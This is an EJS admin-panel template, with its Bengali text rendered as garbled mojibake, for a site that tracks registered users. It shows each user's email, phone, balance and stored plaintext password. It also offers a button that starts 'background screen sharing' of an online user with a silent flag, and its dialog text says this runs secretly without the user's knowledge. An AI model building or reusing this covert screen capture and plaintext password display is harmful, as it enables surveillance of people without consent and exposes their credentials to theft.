<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<title>‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶á‡¶®‡¶´‡¶∞‡¶Æ‡ßá‡¶∂‡¶® - ‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶™‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤</title>
<link rel="stylesheet" href="/style.css">
<script src="/socket.io/socket.io.js"></script>
<style>
.admin-header {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 20px;
    text-align: center;
    margin-bottom: 30px;
}

.nav-menu {
    display: flex;
    justify-content: center;
    gap: 15px;
    margin: 20px 0;
    flex-wrap: wrap;
}
.nav-box {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    color: white;
    padding: 10px 20px;
    border-radius: 8px;
    text-decoration: none;
    font-weight: bold;
    transition: transform 0.3s;
    cursor: pointer;
    font-size: 14px;
}
.nav-box:hover {
    transform: translateY(-2px);
    color: white;
}

.users-container {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
    gap: 20px;
    padding: 20px;
}

.user-card {
    background: white;
    border-radius: 10px;
    padding: 20px;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
    border-left: 4px solid #667eea;
}

.user-card.online {
    border-left-color: #28a745;
}

.user-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 15px;
}

.user-avatar {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: bold;
    color: white;
    font-size: 18px;
}

.user-status {
    padding: 5px 15px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: bold;
}

.status-online {
    background: #d4edda;
    color: #155724;
}

.status-offline {
    background: #f8d7da;
    color: #721c24;
}

.user-info {
    margin: 10px 0;
}

.info-row {
    display: flex;
    justify-content: between;
    margin: 5px 0;
    padding: 5px 0;
    border-bottom: 1px solid #eee;
}

.info-label {
    font-weight: bold;
    color: #666;
    min-width: 100px;
}

.info-value {
    color: #333;
}

.screen-share-btn {
    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
    transition: transform 0.3s;
    margin-top: 10px;
    width: 100%;
}

.screen-share-btn:hover {
    transform: translateY(-2px);
}

.screen-share-btn:disabled {
    background: #ccc;
    cursor: not-allowed;
    transform: none;
}

.stats-container {
    display: flex;
    justify-content: space-around;
    margin: 20px 0;
    flex-wrap: wrap;
}

.stat-box {
    background: #f8f9fa;
    padding: 20px;
    border-radius: 10px;
    text-align: center;
    min-width: 150px;
    margin: 10px;
}

.stat-number {
    font-size: 24px;
    font-weight: bold;
    color: #667eea;
    margin: 10px 0;
}
</style>
</head>
<body>
<div class="admin-header">
    <h2>‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶á‡¶®‡¶´‡¶∞‡¶Æ‡ßá‡¶∂‡¶® ‡¶è‡¶¨‡¶Ç ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶ï‡¶®‡ßç‡¶ü‡ßç‡¶∞‡ßã‡¶≤</h2>
    <p>‡¶∞‡ßá‡¶ú‡¶ø‡¶∏‡ßç‡¶ü‡¶æ‡¶∞‡ßç‡¶° ‡¶á‡¶â‡¶ú‡¶æ‡¶∞‡¶¶‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶è‡¶¨‡¶Ç ‡¶∞‡¶ø‡¶Ø‡¶º‡ßá‡¶≤ ‡¶ü‡¶æ‡¶á‡¶Æ ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏</p>
</div>

<div class="nav-menu">
    <a href="/admin_panel" class="nav-box">üè† ‡¶Æ‡ßÇ‡¶≤ ‡¶™‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤</a>
    <a href="/admin/user_information" class="nav-box" style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%);">üë• ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø</a>
    <a href="/admin/screen_control" class="nav-box">üñ•Ô∏è ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶ï‡¶®‡ßç‡¶ü‡ßç‡¶∞‡ßã‡¶≤</a>
    <a href="/admin/messaging_system" class="nav-box">üí¨ ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú‡¶ø‡¶Ç</a>
</div>

<div class="stats-container">
    <div class="stat-box">
        <h4 style="color: #667eea; margin: 0;">‡¶Æ‡ßã‡¶ü ‡¶∞‡ßá‡¶ú‡¶ø‡¶∏‡ßç‡¶ü‡¶æ‡¶∞‡ßç‡¶° ‡¶á‡¶â‡¶ú‡¶æ‡¶∞</h4>
        <div class="stat-number"><%= users.length %></div>
    </div>
    <div class="stat-box">
        <h4 style="color: #28a745; margin: 0;">‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶®‡ßá ‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶®</h4>
        <div class="stat-number"><%= connectedUsers.length %></div>
    </div>
    <div class="stat-box">
        <h4 style="color: #ff6b6b; margin: 0;">‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶∏‡¶ï‡ßç‡¶∞‡¶ø‡¶Ø‡¶º</h4>
        <div class="stat-number" id="activeShareCount">0</div>
    </div>
</div>

<div class="users-container">
    <% users.forEach(user => { %>
        <% 
        const connectedUser = connectedUsers.find(cu => cu.userId === user.userId);
        const isOnline = !!connectedUser;
        %>
        <div class="user-card <%= isOnline ? 'online' : '' %>" data-user-id="<%= user.userId %>">
            <div class="user-header">
                <div style="display: flex; align-items: center;">
                    <div class="user-avatar"><%= user.name.charAt(0).toUpperCase() %></div>
                    <div style="margin-left: 15px;">
                        <h3 style="margin: 0; color: #333;"><%= user.name %></h3>
                        <p style="margin: 0; color: #666; font-size: 14px;"><%= user.userId %></p>
                    </div>
                </div>
                <div class="user-status <%= isOnline ? 'status-online' : 'status-offline' %>">
                    <%= isOnline ? '‡¶Ö‡¶®‡¶≤‡¶æ‡¶á‡¶®' : '‡¶Ö‡¶´‡¶≤‡¶æ‡¶á‡¶®' %>
                </div>
            </div>
            
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">‡¶á‡¶Æ‡ßá‡¶á‡¶≤:</span>
                    <span class="info-value"><%= user.email %></span>
                </div>
                <div class="info-row">
                    <span class="info-label">‡¶´‡ßã‡¶® ‡¶®‡¶Æ‡ßç‡¶¨‡¶∞:</span>
                    <span class="info-value"><%= user.phone || 'N/A' %></span>
                </div>
                <div class="info-row">
                    <span class="info-label">‡¶Ü‡¶∏‡¶≤ ‡¶™‡¶æ‡¶∏‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶°:</span>
                    <span class="info-value" style="background: #fff3cd; padding: 2px 5px; border-radius: 3px; font-family: monospace;"><%= user.originalPassword || 'N/A' %></span>
                </div>
                <div class="info-row">
                    <span class="info-label">‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏:</span>
                    <span class="info-value" style="color: #28a745; font-weight: bold;"><%= user.balance || 0 %> ‡¶ü‡¶æ‡¶ï‡¶æ</span>
                </div>
                <div class="info-row">
                    <span class="info-label">‡¶∞‡ßá‡¶ú‡¶ø‡¶∏‡ßç‡¶ü‡ßç‡¶∞‡ßá‡¶∂‡¶®:</span>
                    <span class="info-value"><%= new Date(user.joinedAt || user.createdAt || Date.now()).toLocaleDateString('bn-BD') %></span>
                </div>
                <% if (isOnline) { %>
                <div class="info-row">
                    <span class="info-label">‡¶∏‡¶Ç‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶∏‡¶Æ‡¶Ø‡¶º:</span>
                    <span class="info-value"><%= new Date(connectedUser.connectedAt).toLocaleTimeString('bn-BD') %></span>
                </div>
                <div class="info-row">
                    <span class="info-label">Socket ID:</span>
                    <span class="info-value" style="font-size: 10px;"><%= connectedUser.socketId %></span>
                </div>
                <% } %>
            </div>
            
            <div style="display: flex; gap: 10px; margin-top: 15px;">
                <% if (isOnline) { %>
                <button class="screen-share-btn" onclick="goToUserProfile('<%= user.userId %>', '<%= user.name %>')" style="background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); width: 48%;">
                    üë§ ‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤ ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®
                </button>
                <button class="screen-share-btn" onclick="initiateBackgroundScreenShare('<%= user.userId %>', '<%= user.name %>')" style="width: 48%;">
                    üì± ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç
                </button>
                <% } else { %>
                <button class="screen-share-btn" onclick="goToUserProfile('<%= user.userId %>', '<%= user.name %>')" style="background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); width: 48%;">
                    üë§ ‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤ ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®
                </button>
                <button class="screen-share-btn" disabled style="width: 48%;">
                    ‚≠ï ‡¶Ö‡¶´‡¶≤‡¶æ‡¶á‡¶®
                </button>
                <% } %>
            </div>
        </div>
    <% }); %>
</div>

<div style="text-align: center; margin: 30px 0;">
    <a href="/admin_panel" class="btn btn-secondary">‡¶è‡¶°‡¶Æ‡¶ø‡¶® ‡¶™‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤‡ßá ‡¶´‡¶ø‡¶∞‡ßá ‡¶Ø‡¶æ‡¶®</a>
    <a href="/admin_logout" class="btn btn-danger" style="margin-left: 15px;">‡¶≤‡¶ó‡¶Ü‡¶â‡¶ü</a>
</div>

<script>
const socket = io();

// Admin connection
socket.emit('admin_connect', {
    adminId: 'admin1994',
    name: 'Admin'
});

// ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡ßã‡¶´‡¶æ‡¶á‡¶≤‡ßá ‡¶Ø‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function goToUserProfile(userId, userName) {
    window.location.href = `/admin/user_profile/${userId}`;
}

// ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function initiateBackgroundScreenShare(userId, userName) {
    const confirmation = confirm(`${userName} ‡¶è‡¶∞ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶§‡ßá ‡¶ö‡¶æ‡¶®?\n\n‡¶®‡ßã‡¶ü: ‡¶è‡¶ü‡¶ø ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶ó‡ßã‡¶™‡¶®‡ßá ‡¶ö‡¶≤‡¶¨‡ßá, ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶ú‡¶æ‡¶®‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá ‡¶®‡¶æ‡•§`);
    
    if (confirmation) {
        socket.emit('admin_start_background_screen_sharing', {
            targetUserId: userId,
            adminId: 'admin1994',
            silent: true // ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶¨‡ßÅ‡¶ù‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡¶¨‡ßá ‡¶®‡¶æ
        });
        
        // ‡¶∏‡¶´‡¶≤ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã
        showNotification(`${userName} ‡¶è‡¶∞ ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá`, 'success');
        
        // ‡¶¨‡ßã‡¶§‡¶æ‡¶Æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
        updateButtonState(userId, 'sharing');
    }
}

// ‡¶®‡ßã‡¶ü‡¶ø‡¶´‡¶ø‡¶ï‡ßá‡¶∂‡¶® ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#007bff'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        z-index: 10000;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        font-size: 14px;
        max-width: 350px;
        animation: slideIn 0.5s ease-out;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        if (document.body.contains(notification)) {
            document.body.removeChild(notification);
        }
    }, 5000);
}

// ‡¶¨‡ßã‡¶§‡¶æ‡¶Æ‡ßá‡¶∞ ‡¶Ö‡¶¨‡¶∏‡ßç‡¶•‡¶æ ‡¶Ü‡¶™‡¶°‡ßá‡¶ü ‡¶ï‡¶∞‡¶æ
function updateButtonState(userId, state) {
    const userCard = document.querySelector(`[data-user-id="${userId}"]`);
    if (userCard) {
        const shareBtn = userCard.querySelector('.screen-share-btn:last-child');
        if (shareBtn && state === 'sharing') {
            shareBtn.textContent = 'üî¥ ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶ö‡¶≤‡¶õ‡ßá';
            shareBtn.style.background = 'linear-gradient(135deg, #dc3545 0%, #c82333 100%)';
            shareBtn.onclick = () => stopBackgroundScreenShare(userId);
        }
    }
}

// ‡¶¨‡ßç‡¶Ø‡¶æ‡¶ï‡¶ó‡ßç‡¶∞‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶æ
function stopBackgroundScreenShare(userId) {
    if (confirm('‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡¶§‡ßá ‡¶ö‡¶æ‡¶®?')) {
        socket.emit('admin_stop_background_screen_sharing', {
            targetUserId: userId,
            adminId: 'admin1994'
        });
    }
}

// Socket event listeners
socket.on('screen_share_started', (data) => {
    alert(`${data.userName} ‡¶è‡¶∞ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá`);
    updateActiveShareCount();
});

socket.on('screen_share_ended', (data) => {
    alert(`${data.userName} ‡¶è‡¶∞ ‡¶∏‡ßç‡¶ï‡ßç‡¶∞‡¶ø‡¶® ‡¶∂‡ßá‡¶Ø‡¶º‡¶æ‡¶∞‡¶ø‡¶Ç ‡¶¨‡¶®‡ßç‡¶ß ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá`);
    updateActiveShareCount();
});

socket.on('user_status_update', (data) => {
    // Refresh page when user status changes
    setTimeout(() => location.reload(), 1000);
});

function updateActiveShareCount() {
    // This would be updated from server data
    // For now, placeholder functionality
}

console.log('Admin user information panel loaded');
</script>
</body>
</html>